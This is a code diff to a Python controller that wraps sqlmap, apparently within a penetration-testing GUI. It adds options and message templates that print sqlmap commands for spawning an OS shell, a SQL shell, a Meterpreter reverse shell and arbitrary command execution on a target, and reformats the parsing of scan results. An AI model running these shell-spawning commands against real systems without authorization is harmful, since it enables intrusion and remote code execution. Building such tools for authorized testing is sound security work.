@@ -43,7 +43,17 @@ SET_STRING = "set_string"
 SET_FILE = "set_file"
 SET_CRAWL = "set_crawl"
 TEST_FORMS = "test_forms"
+OS_SHELL = "os_shell"
+PWN_SHELL = "pwn_shell"
+EXECUTE_COMMAND = "execute_command"
+SQL_SHELL = "sql_shell"
+RADIO_SHELL = "radio_shell"
 
+
+OS_SHELL_MSG = 'You can try to spawn an OS Shell via sqlmap by running this command in a terminal (you have to put data in <> tags):\nsqlmap -u {} --data {} --batch --os-shell'
+SQL_SHELL_MSG = 'You can try to spawn a SQL shell via sqlmap and Meterpreter by running this command in a terminal (you have to put data in <> tags):\nsqlmap -u {} --data {} --batch --sql-shell'
+PWN_SHELL_MSG = 'You can try to spawn a Reverse shell via sqlmap and Meterpreter by running this command in a terminal (you have to put data in <> tags):\nsqlmap -u {} --data {} --batch --os-pwn'
+EXECUTE_COMMAND_MSG = 'You can try to execute a command via sqlmap by running this command in a terminal (you have to put data in <> tags):\nsqlmap -u {} --data {} --batch --os-cmd <command>'
 
 TEMP_FILE_NAME = "tmp/sqmap-temp"
 TOOL_DISPLAY_NAME = "Sqlmap"
@@ -52,6 +62,10 @@ RUNNING_MESSAGE = f"Running {TOOL_DISPLAY_NAME} with command: "
 
 
 scan_options = [
+    ("Spawn Os Shell", "radio", OS_SHELL, RADIO_SHELL),
+    ("Spawn Reverse Shell", "radio", PWN_SHELL, RADIO_SHELL),
+    ("Execute Command", "radio", EXECUTE_COMMAND, RADIO_SHELL),
+    ("Spawn SQL Shell", "radio", SQL_SHELL, RADIO_SHELL),
     ("Set Data for Requests", "text", REQUEST_DATA, "id=* / data1=*&data2=*"),
     ("Set Cookie value", "text", SET_COOKIE, "PHPSESSID=a8d127e"),
     ("Set Proxy to connect with", "text", SET_PROXY, "http://proxy.com"),
@@ -88,28 +102,38 @@ scan_options = [
 ]
 
 
-
 class SqlmapController(Controller):
-    
+
     def __init__(self):
         super().__init__(TOOL_NAME, TEMP_FILE_NAME)
-        
-        
+        self.os_shell = False
+        self.shell_option = None
+        self.target = None
+        self.data = None
+
     def __build_command__(self, target: str, options: dict) -> list:
+        
+        self.os_shell = False
+        self.shell_option = None
+        self.target = None
+        self.data = None
+        
         command = [
             "sqlmap",
             "-u",
             target,
-            '--output-dir',
-            f'./{TEMP_FILE_NAME}',
+            "--output-dir",
+            f"./{TEMP_FILE_NAME}",
             "--dump-format=CSV",
             "--batch",
             "-v 4",
         ]
         
-        
+        self.target = target
+
         if options.get(REQUEST_DATA, False):
-            command.extend(["--data", f'"{options[REQUEST_DATA]}"'])
+            self.data = f'"{options[REQUEST_DATA]}"'
+            command.extend(["--data", self.data])
 
         if options.get(SET_COOKIE, False):
             command.extend(["--cookie", f'"{options[SET_COOKIE]}"'])
@@ -128,7 +152,7 @@ class SqlmapController(Controller):
 
         if options.get(SET_DBMS, False):
             command.extend(["--dbms=", f'"{options[SET_DBMS]}"'])
-        
+
         if options.get(SET_LEVEL, False):
             command.extend(["--level= ", options[SET_PARAMETER]])
 
@@ -210,17 +234,21 @@ class SqlmapController(Controller):
         if options.get(TEST_FORMS, False):
             command.append("--forms")
 
+        if options.get(RADIO_SHELL, False):
+            self.os_shell = True
+            self.shell_option = options[RADIO_SHELL]
+
         return command
-    
+
     def __run_command__(self, command) -> Thread:
         class SqlmapCommandThread(CommandThread):
             def run(self):
                 super().run()
                 if self._stop_event.is_set():
                     self.calling_controller.__remove_temp_file__()
-                    
+
         return SqlmapCommandThread(command, self)
-    
+
     def __remove_temp_file__(self):
         """
         Needs to override super method because sqlmap saves temp files in more folders.
@@ -233,8 +261,8 @@ class SqlmapController(Controller):
         except Exception as e:
             l.error(f"Couldn't remove temp {self.tool_name} folder.")
             print(e)
-            
-    def __parse_temp_results_file__(self) -> Tuple[dict, Exception]:
+
+    def __parse_temp_results_file__(self) -> Tuple[object, Exception]:
         # List to store all dumped data
         json_objects = []
         TEMP_PATH = "./" + TEMP_FILE_NAME
@@ -253,46 +281,59 @@ class SqlmapController(Controller):
                         for file_name in os.listdir(dump_folder):
                             file_path = os.path.join(dump_folder, file_name)
                             if os.path.isfile(file_path):
-                                
-                                with open(file_path, 'r') as file:                              
+
+                                with open(file_path, "r") as file:
                                     csv_content = [row for row in csv.DictReader(file)]
                                     json_object[dump][file_name] = csv_content
-                    
 
-                        json_objects.append(json_object)  
-                        
+                        json_objects.append(json_object)
+
                 elif os.path.isfile(os.path.join(scan_path, "log")):
                     log_path = os.path.join(scan_path, "log")
-                    
+
                     with open(log_path, "r") as file:
                         json_objects.append(file.read())
-                                                
+
         if len(json_objects) == 0:
-            return None, None                             
-               
+            return None, None
+
         return json_objects, None
-    
-    
+
     def __format_html__(self) -> str:
-        html_output = ''
+        html_output = ""
         
+        if self.os_shell:
+            if self.shell_option == OS_SHELL:
+                html_output += f'<textarea readonly style="height 30vh; width: calc(100%); font-family: \'Courier New\', Courier, monospace;"> '
+                html_output += OS_SHELL_MSG.format(self.target, self.data)
+                html_output += "</textarea><br><br>"
+            
+        
+
         for db in self.last_scan_result:
             if isinstance(db, str):
                 html_output += "<b> Results: </b><br>"
-                html_output += f"<textarea readonly class= 'sqlmap_textarea'> {db} </textarea>"
+                html_output += (
+                    f"<textarea readonly class= 'sqlmap_textarea'> {db} </textarea>"
+                )
             else:
-                html_output += f'<b> {list(db.keys())[0]} :</b> <br>'
-                
+                html_output += f"<b> {list(db.keys())[0]} :</b> <br><br>"
+
                 for section in db:
                     for table in db[section]:
-                        html_output += f'<b> {table} :</b>'
+                        html_output += f"<b> {table} :</b>"
                         if len(db[section][table]) == 0:
-                            html_output += '<p> No data Retrieved </p><br>'
+                            html_output += "<p> No data Retrieved </p><br>"
                         else:
-                            html_output += '<table>'
-                            html_output += render_list_in_dictionary_as_table(db[section][table])
-                            html_output += '</table> <br>'
-                                    
-            html_output += '<br><br>'  
-                    
+                            html_output += "<table>"
+                            html_output += render_list_in_dictionary_as_table(
+                                db[section][table]
+                            )
+                            html_output += "</table> <br>"
+
+
+            html_output += "<br><br>"
+            
+                
+
         return html_output
